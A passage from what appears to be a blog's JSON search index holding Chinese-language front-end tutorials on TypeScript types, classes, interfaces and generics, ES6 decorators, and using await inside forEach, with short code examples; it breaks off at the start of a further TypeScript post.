添加一个any类型，此时就不会报错了，但是也相当于放弃了类型检查了let btn:any = document.getElementById(&#x27;btn&#x27;);btn.style.color = &quot;blue&quot;;// 可以赋值任何类型的值// 跟以前我们var let声明的一模一样的let person:any = &quot;poetries&quot;person = 22\n\n2.8 null undefined类型// (string | number | null | undefined) 相当于这几种类型// 是 string 或 number 或 null 或 undefinedlet str:(string | number | null | undefined)str = &#x27;poetries&#x27;str = 28str = null str = undefined\n\n2.9 void类型\nvoid表示没有任何类型，一般是定义函数没有返回值\n\n// void 不能再函数里写return// 怎么理解叫没有返回值呢？此时我们给函数return一个值function say(name:string):void&#123;    console.log(&#x27;hello:&#x27;, name)    // return &quot;ok&quot; 会报错    return undefined;    return //不会报错&#125;say(&#x27;poetries&#x27;)// 返回一个字符串类型function say1(name:string):string &#123;    return &#x27;ok&#x27;&#125;\n\n2.10 never类型\n这个用得很少，一般是用于抛出异常\n\nfunction error(message:string):never &#123;    throw new Error(message)&#125;error(&#x27;errorMsg&#x27;)\n\n2.11 我们要搞明白any、never、void\nany是任意的值\nvoid是不能有任何值\nnever永远不会有返回值\n\n\nany比较好理解，就是任何值都可以\n\nlet str:any = &quot;hello poetries&quot;str = 28str = true\n\n\nvoid不能有任何值(返回值)\n\nfunction say():void &#123;  &#125;\n\n\nnever则不好理解，什么叫永远不会有返回值？\n\n// 除了上面举例的抛出异常以外，我们看一下这个例子// 这个loop函数，一旦开始执行，就永远不会结束// 可以看出在while中，是死循环，永远都不会有返回值，包括undefinedfunction loop():never &#123;    while(true)&#123;        console.log(&quot;陷入死循环啦&quot;)    &#125;&#125;loop()// 包括比如JSON.parse也是使用这种 never | anyfunction parse(str:string):(never | any)&#123;    return JSON.parse(str)&#125;// 首先在正常情况下，我们传一个JSON格式的字符串，是可以正常得到一个JSON对象的let json = parse(&#x27;&#123;&quot;name&quot;:&quot;poetries&quot;&#125;&#x27;)// 但是有时候，传进去的不一定是JSON格式的字符串，那么就会抛出异常// 此时就需要never了let json = parse(&quot;iamswr&quot;)\n\n\n也就是说，当一个函数执行的时候，被抛出异常打断了，导致没有返回值或者该函数是一个死循环，永远没有返回值，这样叫做永远不会有返回值。\n\n实际开发中，是never和联合类型来一起用，比如\nfunction say():(never | string) &#123;  return &quot;ok&quot;&#125;\n\n三、函数3.1 函数定义function sayHello(name:string):void &#123;    &#125;\n\n3.2 函数参数处理// 函数是这样定义的// 形参和实参一一对应，完全一样function sayHello(name:string,age:number):void &#123;    console.log(&#x27;hello&#x27;, name, age)&#125;sayHello(&#x27;poetries&#x27;,22)// 形参和实参要完全一样，如想不一样，则需要配置可选参数，可选参数放在后面// 可选参数，用 ？ 处理，只能放在后面function sayHelloToYou(name:string,age?:number):void &#123;    console.log(&#x27;hello&#x27;, name, age)&#125;sayHelloToYou(&#x27;poetries&#x27;)// 那么如何设置默认参数呢？function ajax(url:string,method:string = &#x27;GET&#x27;) &#123;    console.log(url, method)&#125;// 那么如何设置剩余参数呢？可以利用扩展运算符function sum(...args:Array&lt;number&gt;):number &#123;    return eval(args.join(&quot;+&quot;))&#125;let total:number = sum(1,2,3,4,5)console.log(total)\n\n3.3 函数重载// 那么如何实现函数重载呢？函数重载是java中非常有名的，在java中函数的重载，是指两个或者两个以上的同名函数，参数的个数和类型不一样// 比如我们现在有两个同名函数// function eating(name:string) &#123;    // &#125;// function eating(name:string,age:number) &#123;    // &#125;// 那么我想达到一个效果// 当我传参数name时，执行name:string这个函数// 当我传参数name和age时，执行name:string,age:number这个函数// 此时该怎么办？// 接下来看一下typescript中的函数重载// 首先声明两个函数名一样的函数function eating(name: string):void;function eating(name: number):void;function eating(name:any): void &#123;    console.log(name)&#125;eating(&quot;hello poetries&quot;)eating(22)// 在typescript中主要体现是同一个同名函数提供多个函数类型定义，函数实际上就只有一个，就是拥有函数体那个，如果想根据传入值类型的不一样执行不同逻辑，则需要在这个函数里面进行一个类型判断。// 那么这个函数重载有什么作用呢？其实在ts中，函数重载只是用来限制参数的个数和类型，用来检查类型的，而且重载不能拆开几个函数，这一点和java的处理是不一样的，需要注意。\n\n四、类4.1 定义一个类\n如何定义一个类？\n\n// ts 写法// 跟es6非常像 没有太大区别class Persion &#123;    // 这里声明的变量 是实例上的属性    name: string;    age:number;    constructor(name: string, age: number)&#123;        // this.name和this.age 必须先在前面声明好类型        // name: string        // age: number        this.name = name;        this.age = age;    &#125;    // 原型方法    say():string &#123;        return &#x27;hello poetries&#x27;    &#125;&#125;let p = new Persion(&#x27;poetries&#x27;, 22)// 那么转为es5呢？var Persion = /** @class */ (function () &#123;    function Persion(name, age) &#123;        // this.name和this.age 必须先在前面声明好类型        // name: string        // age: number        this.name = name;        this.age = age;    &#125;    // 原型方法    Persion.prototype.say = function () &#123;        return &#x27;hello poetries&#x27;;    &#125;;    return Persion;&#125;());var p = new Persion(&#x27;poetries&#x27;, 22);\n\n4.2 类的继承// 和es6也是差不多class Parent &#123;    name: string;    age: number;    constructor(name:string, age: number)&#123;        this.name = name;        this.age = age;    &#125;    say():string&#123;        return &#x27;hello poetries&#x27;    &#125;&#125;class Child extends Parent &#123;    childName: string;    constructor(name: string,age:number,childName:string) &#123;        super(name,age)        this.childName = childName    &#125;    childSay():string &#123;        return this.childName    &#125;&#125;let child = new Child(&#x27;poetries&#x27;, 22, &#x27;静观流叶&#x27;)console.log(child)\n\n4.3 类的修饰符\npublic公开的，可以供自己、子类以及其它类访问\nprotected受保护的，可以供自己、子类访问，但是其他就访问不了\nprivate私有的，只有自己访问，而子类、其他都访问不了\n\nclass Parents &#123;    public name:string;    protected age:number;    private money:number;   // 简写   // constructor(public name:string,protected age:number,private money:number)   constructor(name: string, age:number,money:number) &#123;       this.name = name;       this.age = age;       this.money = money;   &#125;   getName():string &#123;       return this.name   &#125;   getAge():number&#123;       return this.age   &#125;   getMoney():number&#123;       return this.money   &#125;&#125;let pare = new Parents(&#x27;poetries&#x27;, 22, 3000)console.log(pare.name)// console.log(pare.age)  报错// console.log(pare.money) 报错\n\n4.4 静态属性、静态方法跟es6差不多\nclass Person2 &#123;    // 类的静态属性    static name1 = &#x27;poetries&#x27;    // 类的静态方法    static say() &#123;        console.log(&#x27;hello poetries&#x27;)    &#125;&#125;let per2 = new Person2()Person2.say() // hello poetries// per2.say() 报错\n\n4.5 抽象类\n抽象类和方法，有点类似抽取共性出来，但是又不是具体化，比如说，世界上的动物都需要吃东西，那么会把吃东西这个行为，抽象出来\n如果子类继承的是一个抽象类，子类必须实现父类里的抽象方法，不然的话不能实例化，会报错\n\n/ 关键字 abstract抽象// 定义抽象类abstract class Animal &#123;    // 实际上是使用了public修饰符    // 如果添加private修饰符会报错    abstract eat():void;&#125;// 需要注意的是这个Animal是不能实例化的// let animal = new Animal() // 报错// // 抽象类的抽象方法，意思就是，需要在继承这个抽象类的子类中// 实现这个抽象方法，不然会报错// 报错，因为在子类中没有实现eat抽象方法// class Person4 extends Animal&#123;//     test()&#123;//         console.log(&quot;吃米饭&quot;)//     &#125;// &#125;// Dog类继承Animal类后并且实现了抽象方法eat，所以不会报错class Dog extends Animal&#123;    eat()&#123;        console.log(&quot;吃骨头&quot;)    &#125;&#125;\n\n五、接口\n这里的接口，主要是一种规范，规范某些类必须遵守规范，和抽象类有点类似，但是不局限于类，还有属性、函数等\n\n5.1 接口规范对象//假设我们需要获取用户信息// 我们通过这样的方式 规范必须传name和age的值function getUserInfo(user:&#123;name:string,age:number&#125;) &#123;    console.log(user.name,user.age)&#125;getUserInfo(&#123;name: &#x27;poetries&#x27;, age: 22&#125;)// 这样看挺完美的， 那么问题就出现了，如果我另外还有一个方法，也是需要这个规范呢？function getUserInfo1(user:&#123;name:string,age:number&#125;)&#123;    console.log(`$&#123;user.name&#125; $&#123;user.age&#125;`)&#125;function getInfo(user:&#123;name:string,age:number&#125;)&#123;    console.log(`$&#123;user.name&#125; $&#123;user.age&#125;`)&#125;getUserInfo1(&#123;name:&quot;poetries&quot;,age:22&#125;)getInfo(&#123;name:&quot;poetries&quot;,age:22&#125;)// 可以看出，函数getUserInfo和getInfo都遵循同一个规范，那么我们有办法对这个规范复用吗？// 首先把需要复用的规范，写到接口 关键字interfaceinterface infoInterface &#123;    name: string,    age: number;&#125;// 然后把这个接口 替换到我们需要复用的地方function getUserInfo2(user:infoInterface) &#123;    console.log(user.name,user.age)&#125;function getInfo2(user:infoInterface) &#123;    console.log(user.name,user.age)&#125;getUserInfo2(&#123;name:&quot;poetries&quot;,age:22&#125;)getInfo2(&#123;name:&quot;poetries&quot;,age:22&#125;)// 那么有些参数可传可不传，该怎么处理呢？interface infoInterface2&#123;    name: string;    age: number;    city?:string;&#125;function getUserInfo3(user:infoInterface2)&#123;    console.log(`$&#123;user.name&#125; $&#123;user.age&#125; $&#123;user.city&#125;`)&#125;function getInfo3(user:infoInterface)&#123;    console.log(`$&#123;user.name&#125; $&#123;user.age&#125;`)&#125;getUserInfo3(&#123;name:&quot;poetries&quot;,age:22,city:&quot;深圳&quot;&#125;)getInfo3(&#123;name:&quot;iamswr&quot;,age:22&#125;)\n\n5.2 接口规范函数// 对一个函数的参数和返回值进行规范interface mytotal &#123;    // 左侧是函数的参数，右侧是函数的返回类型    (a:number,b:number):number;&#125;let totalSum:mytotal = function(a:number,b:number):number &#123;    return a + b&#125;console.log(totalSum(10, 20))\n\n5.3 接口规范数组interface userInterface &#123;    // index为数组索引 类型是number    // 右边是数组里为字符串的数组成员    [index: number]: string;&#125;let arrTest: userInterface = [&#x27;poetries&#x27;, &#x27;静观流叶&#x27;]console.log(arrTest)\n\n5.4 接口规范类\n这个比较重要，因为写react的时候会经常使用到类\n\n// 首先实现一个接口interface Animal2 &#123;    // 这个类必须有name    name:string;    // 这个类必须有eat方法    eat(any:string):void;&#125;// 关键字implements实现// 因为接口是抽象的，需要通过子类是实现它class Person6 implements Animal2 &#123;    name: string;    constructor(name: string) &#123;        this.name = name;    &#125;    eat(any:string):void &#123;        console.log(`吃`+any)    &#125;&#125;// 如果想遵循多个接口interface Animal3 &#123;    name: string;    eat(any: string):void;&#125;// 新增一个接口interface Animal4 &#123;    sleep():void;&#125;// 可以在implements后面通过逗号添加和java一样class Person7 implements Animal3,Animal4 &#123;    name: string;    constructor(name:string)&#123;        this.name = name;    &#125;    eat(any:string) &#123;        console.log(`吃`+any)    &#125;    sleep() &#123;        console.log(&#x27;睡觉&#x27;)    &#125;&#125;\n\n5.5 接口继承接口interface Animal5&#123;    name:string;    eat(any:string):void;&#125;// 像类一样 通过extends继承interface Animal6 extends Animal5 &#123;    sleep():void;&#125;// 因为Animal6类继承了Animal5// 所以这里遵循Animal6就相当于把Animal5也继承了class Person8 implements Animal2 &#123;    name: string;    constructor(name:string) &#123;        this.name = name;    &#125;    eat(any:string):void&#123;        console.log(`吃$&#123;any&#125;`)    &#125;    sleep()&#123;        console.log(&#x27;睡觉&#x27;)    &#125;&#125;\n\n六、泛型6.1 函数的泛型\n泛型可以支持不特定的数据类型，什么叫不特定呢？比如我们有一个方法，里面接收参数，但是参数类型我们是不知道，但是这个类型在方法里面很多地方会用到，参数和返回值要保持一致性\n\n// 假设我们有一个需求，我们不知道函数接收什么类型的参数，也不知道返回值的类型// 而我们又需要传进去的参数类型和返回值的类型保持一致，那么我们就需要用到泛型// &lt;T&gt;的意思是泛型，即generic type// 可以看出value的类型也为T，返回值的类型也为Tfunction deal&lt;T&gt;(value:T):T&#123;    return value&#125;// 下面的&lt;string&gt;、&lt;number&gt;实际上用的时候再传给上面的&lt;T&gt;console.log(deal&lt;string&gt;(&quot;poetries&quot;))console.log(deal&lt;number&gt;(22))\n\n\n实际上，泛型用得还是比较少，主要是看类的泛型是如何使用的\n\n6.2 类的泛型class MyMath&lt;T&gt; &#123;    // 定义一个私有属性    private arr: T[] = []    // 规定传参类型    add(value: T) &#123;        this.arr.push(value)    &#125;&#125;// 这里规定了类型为number// 相当于把T替换为numberlet mymath = new MyMath&lt;number&gt;()mymath.add(1)mymath.add(2)mymath.add(3)\n\n有了接口为什么还需要抽象类？\n\n接口里面只能放定义，抽象类里面可以放普通类、普通类的方法、定义抽象的东西。\n\n","categories":["前端"],"tags":["typescript"]},{"title":"ES6 装饰器","url":"/2018/04/17/html+css+js+ts/4-%E8%A3%85%E9%A5%B0%E5%99%A8/","content":"一、简介\n装饰器依赖于 ES5 的 Object.defineProperty 方法\n\n1.1 Object.defineProperty\nObject.defineProperty() 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性， 并返回这个对象\n该方法允许精确添加或修改对象的属性。通过赋值来添加的普通属性会创建在属性枚举期间显示的属性（for...in或 Object.keys 方法）， 这些值可以被改变，也可以被删除。这种方法允许这些额外的细节从默认值改变。默认情况下，使用 Object.defineProperty() 添加的属性值是不可变的\n\nObject.defineProperty(obj, prop, descriptor)\n\n\nobj：要在其上定义属性的对象。\nprop：要定义或修改的属性的名称。\ndescriptor：将被定义或修改的属性描述符。\n返回值：被传递给函数的对象。\n\n\n在ES6中，由于 Symbol类型 的特殊性，用 Symbol类型 的值来做对象的key与常规的定义或修改不同，而Object.defineProperty 是定义 key为 Symbol 的属性的方法之一\n\ndescriptor属性描述符\n\n对象里目前存在的属性描述符有两种主要形式：数据描述符和存取描述符\n\n\n数据描述符是一个具有值的属性，该值可能是可写的，也可能不是可写的。\n存取描述符是由 getter-setter 函数对描述的属性。\n\nconfigurable\n\n当且仅当该属性的 configurable 为 true 时，该属性描述符才能够被改变，同时该属性也能从对应的对象上被删除。默认为 false\n\nenumerable\n\nenumerable定义了对象的属性是否可以在 for...in循环和 Object.keys() 中被枚举。\n当且仅当该属性的 enumerable 为 true 时，该属性才能够出现在对象的枚举属性中。默认为 false。\n\n二、Babel安装编译\nnpm install --save-dev @babel/core @babel/clinpm install --save-dev @babel/plugin-proposal-decorators @babel/plugin-proposal-class-properties\n\n\n新建 .babelrc 文件\n\n&#123;  &quot;plugins&quot;: [    [&quot;@babel/plugin-proposal-decorators&quot;, &#123; &quot;legacy&quot;: true &#125;],    [&quot;@babel/plugin-proposal-class-properties&quot;, &#123;&quot;loose&quot;: true&#125;]  ]&#125;\n\n再编译指定的文件\nbabel decorator.js --out-file decorator-compiled.js\n\n三、用法装饰器主要用于\n\n装饰类\n装饰方法或属性\n\n3.1 类的装饰@testableclass MyTestableClass &#123;  // ...&#125;function testable(target) &#123;  target.isTestable = true;&#125;MyTestableClass.isTestable // true\n\n\n上面代码中，@testable 就是一个装饰器。它修改了 MyTestableClass这 个类的行为，为它加上了静态属性isTestable。testable 函数的参数 target 是 MyTestableClass 类本身\n\n基本上，装饰器的行为就是下面这样\n@decoratorclass A &#123;&#125;// 等同于class A &#123;&#125;A = decorator(A) || A;\n\n\n也就是说，装饰器是一个对类进行处理的函数。装饰器函数的第一个参数，就是所要装饰的目标类\n\n如果觉得一个参数不够用，可以在装饰器外面再封装一层函数\nfunction testable(isTestable) &#123;  return function(target) &#123;    target.isTestable = isTestable;  &#125;&#125;@testable(true)class MyTestableClass &#123;&#125;MyTestableClass.isTestable // true@testable(false)class MyClass &#123;&#125;MyClass.isTestable // false\n\n\n上面代码中，装饰器 testable 可以接受参数，这就等于可以修改装饰器的行为\n\n注意，装饰器对类的行为的改变，是代码编译时发生的，而不是在运行时。这意味着，装饰器能在编译阶段运行代码。也就是说，装饰器本质就是编译时执行的函数。\n\n前面的例子是为类添加一个静态属性，如果想添加实例属性，可以通过目标类的 prototype 对象操作\n\n// mixins.jsexport function mixins(...list) &#123;  return function (target) &#123;    Object.assign(target.prototype, ...list)  &#125;&#125;// main.jsimport &#123; mixins &#125; from &#x27;./mixins&#x27;const Foo = &#123;  foo() &#123; console.log(&#x27;foo&#x27;) &#125;&#125;;@mixins(Foo)class MyClass &#123;&#125;let obj = new MyClass();obj.foo() // &#x27;foo&#x27;\n\n\n上面代码通过装饰器 mixins，把Foo对象的方法添加到了 MyClass的实例上面\n\n3.2 方法的装饰\n装饰器不仅可以装饰类，还可以装饰类的属性\n\nclass Person &#123;// 装饰器 readonly 用来装饰“类”的name方法。  @readonly  name() &#123; return `$&#123;this.first&#125; $&#123;this.last&#125;` &#125;&#125;\n\n\n装饰器函数 readonly 一共可以接受三个参数。\n\nfunction readonly(target, name, descriptor)&#123;  // descriptor对象原来的值如下  // &#123;  //   value: specifiedFunction,  //   enumerable: false,  //   configurable: true,  //   writable: true  // &#125;;  descriptor.writable = false;  return descriptor;&#125;readonly(Person.prototype, &#x27;name&#x27;, descriptor);// 类似于Object.defineProperty(Person.prototype, &#x27;name&#x27;, descriptor);\n\n\n第一个参数是类的原型对象，上例是 Person.prototype，装饰器的本意是要“装饰”类的实例，但是这个时候实例还没生成，所以只能去装饰原型（这不同于类的装饰，那种情况时target参数指的是类本身）\n第二个参数是 所要装饰的属性名\n第三个参数是 该属性的描述对象\n\n3.3 函数方法的装饰\n装饰器只能用于类和类的方法，不能用于函数，因为存在函数提升\n另一方面，如果一定要装饰函数，可以采用高阶函数的形式直接执行\n\nfunction doSomething(name) &#123;  console.log(&#x27;Hello, &#x27; + name);&#125;function loggingDecorator(wrapped) &#123;  return function() &#123;    console.log(&#x27;Starting&#x27;);    const result = wrapped.apply(this, arguments);    console.log(&#x27;Finished&#x27;);    return result;  &#125;&#125;const wrapped = loggingDecorator(doSomething);\n\n四、使用场景4.1 装饰器有注释的作用@testableclass Person &#123;  @readonly  @nonenumerable  name() &#123; return `$&#123;this.first&#125; $&#123;this.last&#125;` &#125;&#125;\n\n\n从上面代码中，我们一眼就能看出，Person类是可测试的，而name方法是只读和不可枚举的\n\n4.2 React 的 connect\n实际开发中，React 与 Redux 库结合使用时，常常需要写成下面这样\n\nclass MyReactComponent extends React.Component &#123;&#125;export default connect(mapStateToProps, mapDispatchToProps)(MyReactComponent);\n\n\n有了装饰器，就可以改写上面的代码。装饰\n\n@connect(mapStateToProps, mapDispatchToProps)export default class MyReactComponent extends React.Component &#123;&#125;\n\n4.3 loading\n在 React 项目中，我们可能需要在向后台请求数据时，页面出现 loading 动画。这个时候，你就可以使用装饰器，优雅地实现功能。\n\n@autobind@loadingWrap(true)async handleSelect(params) &#123;  await this.props.dispatch(&#123;    type: &#x27;product_list/setQuerypParams&#x27;,    querypParams: params  &#125;);&#125;\n\n\nloadingWrap 函数如下：\n\nexport function loadingWrap(needHide) &#123;  const defaultLoading = (    &lt;div className=&quot;toast-loading&quot;&gt;      &lt;Loading className=&quot;loading-icon&quot;/&gt;      &lt;div&gt;加载中...&lt;/div&gt;    &lt;/div&gt;  );  return function (target, property, descriptor) &#123;    const raw = descriptor.value;        descriptor.value = function (...args) &#123;      Toast.info(text || defaultLoading, 0, null, true);      const res = raw.apply(this, args);            if (needHide) &#123;        if (get(&#x27;finally&#x27;)(res)) &#123;          res.finally(() =&gt; &#123;            Toast.hide();          &#125;);        &#125; else &#123;          Toast.hide();        &#125;      &#125;    &#125;;    return descriptor;  &#125;;&#125;\n\n4.4 log\n为一个方法添加 log 函数，检查输入的参数：\n\nclass Math &#123;  @log  add(a, b) &#123;    return a + b;  &#125;&#125;let log = (type) =&gt; &#123;  return (target, name, descriptor) =&gt; &#123;    const method = descriptor.value;    descriptor.value =  (...args) =&gt; &#123;      console.info(`($&#123;type&#125;) 正在执行: $&#123;name&#125;($&#123;args&#125;) = ?`);      let ret;      try &#123;        ret = method.apply(target, args);        console.info(`($&#123;type&#125;) 成功 : $&#123;name&#125;($&#123;args&#125;) =&gt; $&#123;ret&#125;`);      &#125; catch (error) &#123;        console.error(`($&#123;type&#125;) 失败: $&#123;name&#125;($&#123;args&#125;) =&gt; $&#123;error&#125;`);      &#125;      return ret;    &#125;  &#125;&#125;;const math = new Math();// Calling add with [2, 4]math.add(2, 4);\n\n4.5 autobindclass Person &#123;  @autobind  getPerson() &#123;      return this;  &#125;&#125;let person = new Person();let &#123; getPerson &#125; = person;getPerson() === person;// true\n\n\n我们很容易想到的一个场景是 React 绑定事件的时候\n\nclass Toggle extends React.Component &#123;  @autobind  handleClick() &#123;      console.log(this)  &#125;  render() &#123;    return (      &lt;button onClick=&#123;this.handleClick&#125;&gt;        button      &lt;/button&gt;    );  &#125;&#125;\n\n\n我们来写这样一个 autobind函数：\n\nconst &#123; defineProperty, getPrototypeOf&#125; = Object;function bind(fn, context) &#123;  if (fn.bind) &#123;    return fn.bind(context);  &#125; else &#123;    return function __autobind__() &#123;      return fn.apply(context, arguments);    &#125;;  &#125;&#125;function createDefaultSetter(key) &#123;  return function set(newValue) &#123;    Object.defineProperty(this, key, &#123;      configurable: true,      writable: true,      enumerable: true,      value: newValue    &#125;);    return newValue;  &#125;;&#125;function autobind(target, key, &#123; value: fn, configurable, enumerable &#125;) &#123;  if (typeof fn !== &#x27;function&#x27;) &#123;    throw new SyntaxError(`@autobind can only be used on functions, not: $&#123;fn&#125;`);  &#125;  const &#123; constructor &#125; = target;  return &#123;    configurable,    enumerable,    get() &#123;      /**       * 使用这种方式相当于替换了这个函数，所以当比如       * Class.prototype.hasOwnProperty(key) 的时候，为了正确返回       * 所以这里做了 this 的判断       */      if (this === target) &#123;        return fn;      &#125;      const boundFn = bind(fn, this);      defineProperty(this, key, &#123;        configurable: true,        writable: true,        enumerable: false,        value: boundFn      &#125;);      return boundFn;    &#125;,    set: createDefaultSetter(key)  &#125;;&#125;\n\n4.6 debounce\n有的时候，我们需要对执行的方法进行防抖处理:\n\nclass Toggle extends React.Component &#123;  @debounce(500, true)  handleClick() &#123;    console.log(&#x27;toggle&#x27;)  &#125;  render() &#123;    return (      &lt;button onClick=&#123;this.handleClick&#125;&gt;        button      &lt;/button&gt;    );  &#125;&#125;function _debounce(func, wait, immediate) &#123;    var timeout;    return function () &#123;        var context = this;        var args = arguments;        if (timeout) clearTimeout(timeout);        if (immediate) &#123;            var callNow = !timeout;            timeout = setTimeout(function()&#123;                timeout = null;            &#125;, wait)            if (callNow) func.apply(context, args)        &#125;        else &#123;            timeout = setTimeout(function()&#123;                func.apply(context, args)            &#125;, wait);        &#125;    &#125;&#125;function debounce(wait, immediate) &#123;  return function handleDescriptor(target, key, descriptor) &#123;    const callback = descriptor.value;    if (typeof callback !== &#x27;function&#x27;) &#123;      throw new SyntaxError(&#x27;Only functions can be debounced&#x27;);    &#125;    var fn = _debounce(callback, wait, immediate)    return &#123;      ...descriptor,      value() &#123;        fn()      &#125;    &#125;;  &#125;&#125;\n\n4.7 time\n用于统计方法执行的时间:\n\nfunction time(prefix) &#123;  let count = 0;  return function handleDescriptor(target, key, descriptor) &#123;    const fn = descriptor.value;    if (prefix == null) &#123;      prefix = `$&#123;target.constructor.name&#125;.$&#123;key&#125;`;    &#125;    if (typeof fn !== &#x27;function&#x27;) &#123;      throw new SyntaxError(`@time can only be used on functions, not: $&#123;fn&#125;`);    &#125;    return &#123;      ...descriptor,      value() &#123;        const label = `$&#123;prefix&#125;-$&#123;count&#125;`;        count++;        console.time(label);        try &#123;          return fn.apply(this, arguments);        &#125; finally &#123;          console.timeEnd(label);        &#125;      &#125;    &#125;  &#125;&#125;\n\n4.8 mixin\n用于将对象的方法混入Class 中\n\nconst SingerMixin = &#123;  sing(sound) &#123;    alert(sound);  &#125;&#125;;const FlyMixin = &#123;  // All types of property descriptors are supported  get speed() &#123;&#125;,  fly() &#123;&#125;,  land() &#123;&#125;&#125;;@mixin(SingerMixin, FlyMixin)class Bird &#123;  singMatingCall() &#123;    this.sing(&#x27;tweet tweet&#x27;);  &#125;&#125;var bird = new Bird();bird.singMatingCall();// alerts &quot;tweet tweet&quot;\n\n\nmixin 的一个简单实现如下\n\nfunction mixin(...mixins) &#123;  return target =&gt; &#123;    if (!mixins.length) &#123;      throw new SyntaxError(`@mixin() class $&#123;target.name&#125; requires at least one mixin as an argument`);    &#125;    for (let i = 0, l = mixins.length; i &lt; l; i++) &#123;      const descs = Object.getOwnPropertyDescriptors(mixins[i]);      const keys = Object.getOwnPropertyNames(descs);      for (let j = 0, k = keys.length; j &lt; k; j++) &#123;        const key = keys[j];        if (!target.prototype.hasOwnProperty(key)) &#123;          Object.defineProperty(target.prototype, key, descs[key]);        &#125;      &#125;    &#125;  &#125;;&#125;","categories":["前端"],"tags":["es6"]},{"title":"await 在 forEach 中不生效解决方案","url":"/2021/05/24/html+css+js+ts/await%20%E5%9C%A8%20forEach%20%E4%B8%AD%E4%B8%8D%E7%94%9F%E6%95%88%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","content":"一、场景function test() &#123;\tlet arr = [3, 2, 1]\tarr.forEach(async item =&gt; &#123;\t\tconst res = await fetch(item)\t\tconsole.log(res)\t&#125;)\tconsole.log(&#x27;end&#x27;)&#125;function fetch(x) &#123;\treturn new Promise((resolve, reject) =&gt; &#123;\t\tsetTimeout(() =&gt; &#123;\t\t\tresolve(x)\t\t&#125;, 500 * x)\t&#125;)&#125;test()\n\n期望的打印顺序是\n321end\n\n结果打印顺序居然是\nend123\n\n原因\n\n那就是 forEach 只支持同步代码。forEach 并不会去处理异步的情况\n\n二、解决办法2.1 第一种是使用 Promise.all 的方式async function test() &#123;\tlet arr = [3, 2, 1]\tawait Promise.all(\t\tarr.map(async item =&gt; &#123;\t\t\tconst res = await fetch(item)\t\t\tconsole.log(res)\t\t&#125;)\t)\tconsole.log(&#x27;end&#x27;)&#125;\n\n\n这样可以生效的原因是 async 函数肯定会返回一个 Promise 对象，调用 map 以后返回值就是一个存放了 Promise 的数组了，这样我们把数组传入 Promise.all 中就可以解决问题了。但是这种方式其实并不能达成我们要的效果，如果你希望内部的 fetch 是顺序完成的，可以选择第二种方式\n\n2.2 另一种方法是使用 for…ofasync function test() &#123;\tlet arr = [3, 2, 1]\tfor (const item of arr) &#123;\t\tconst res = await fetch(item)\t\tconsole.log(res)\t&#125;\tconsole.log(&#x27;end&#x27;)&#125;\n\n\n这种方式相比 Promise.all 要简洁的多，并且也可以实现开头我想要的输出顺序。\n但是这时候你是否又多了一个疑问？为啥 for...of 内部就能让 await 生效呢。\n因为 for...of 内部处理的机制和 forEach 不同，forEach 是直接调用回调函数，for...of 是通过迭代器的方式去遍历。\n\nasync function test() &#123;\tlet arr = [3, 2, 1]\tconst iterator = arr[Symbol.iterator]()\tlet res = iterator.next()\twhile (!res.done) &#123;\t\tconst value = res.value\t\tconst res1 = await fetch(value)\t\tconsole.log(res1)\t\tres = iterator.next()\t&#125;\tconsole.log(&#x27;end&#x27;)&#125;\n\n以上代码等价于 for...of，可以看成 for...of 是以上代码的语法糖\n","categories":["前端","问题"],"tags":["async/await"]},{"title":"Typescript实践总结[基础+工程+实践]","url":"/2021/08/15/html+css+js+ts/5-Typescript%E5%AE%9E%E8%B7%B5%E6%80%BB%E7%BB%93%5B%E5%9F%BA%E7%A1%80+%E5%B7%A5%E7%A8%8B+%E5%AE%9E%E8%B7%B5%5D/","content":"第一章 基础篇\nTS基础篇\n\n\n一、基本类型\nJavaScript 的类型分为两种：原始数据类型和对象类型。\n原始数据类型包括：布尔值、数值、字符串、null、undefined 以及 ES6 中的新类型 Symbol\n本节主要介绍前五种原始数据类型在 TypeScript 中的应用。\n布尔值是最基础的数据类型，在 TypeScript 中，使用 boolean 定义布尔值类型\n\nES6数据类型\n\nBoolean\nNumber\nString\nArray\nFunction\nObject\nSymbol\nundefined\nnull\n\nTypescript数据类型\n\nBoolean\nNumber\nString\nArray\nFunction\nObject\nSymbol\nundefined\nnull\nvoid\nany\nnever\n元组\n枚举\n高级类型\n\n正确的写法\n➖➖➖➖➖➖➖➖➖布尔➖➖➖➖➖➖➖➖➖// 布尔值let isDone: boolean = false;  // 事实上 `new Boolean()` 返回的是一个 `Boolean` 对象let createdByNewBoolean: Boolean = new Boolean(1);//(直接调用 `Boolean` 也可以返回一个 `boolean` 类型) let createdByBoolean: boolean = Boolean(1); ➖➖➖➖➖➖➖➖➖数值➖➖➖➖➖➖➖➖➖// 数值let decLiteral: number = 6;let hexLiteral: number = 0xf00d;// ES6 中的二进制表示法let binaryLiteral: number = 0b1010;// ES6 中的八进制表示法let octalLiteral: number = 0o744;let notANumber: number = NaN;let infinityNumber: number = Infinity;➖➖➖➖➖➖➖➖➖字符串➖➖➖➖➖➖➖➖➖let myName: string = &#x27;Tom&#x27;;➖➖➖➖➖➖➖➖➖空值➖➖➖➖➖➖➖➖➖// 没有返回值的函数为voidfunction alertName(): void &#123;    alert(&#x27;My name is Tom&#x27;);&#125;//声明一个 void 类型的只能将它赋值为 undefined 和 nulllet unusable: void = undefined;➖➖➖➖➖➖➖➖➖Null 和 Undefined➖➖➖➖➖➖➖➖➖// undefined 类型的变量只能被赋值为 undefined，null 类型的变量只能被赋值为 nulllet u: undefined = undefined;let n: null = null;\n\n错误的写法\n\n注意:正确的很好记,大多数人都会写正确的,关键是要记住这些错误的!!!\n\n➖➖➖➖➖➖➖➖➖布尔➖➖➖➖➖➖➖➖➖// 注意，使用构造函数 `Boolean` 创造的对象不是布尔值let createdByNewBoolean: boolean = new Boolean(1);❌➖➖➖➖➖➖➖➖➖数值➖➖➖➖➖➖➖➖➖let decLiteral: number = &quot;6&quot;;❌➖➖➖➖➖➖➖➖➖字符串➖➖➖➖➖➖➖➖➖let myName: string = 999;❌➖➖➖➖➖➖➖➖➖空值➖➖➖➖➖➖➖➖➖// 没有返回值的函数为voidfunction alertName(): void &#123;❌   return 666;&#125;//声明一个 void 类型的只能将它赋值为 undefined 和 nulllet unusable: void = &#x27;I love you&#x27;;❌➖➖➖➖➖➖➖➖➖Null 和 Undefined➖➖➖➖➖➖➖➖➖// undefined 类型的变量只能被赋值为 undefined，null 类型的变量只能被赋值为 nulllet u: undefined = 888;❌let n: null = 999;❌\n\n二、任意值正确的写法\n// 顾名思义,可以被任何值赋值let anyThing: any = &#x27;hello&#x27;;let anyThing: any = 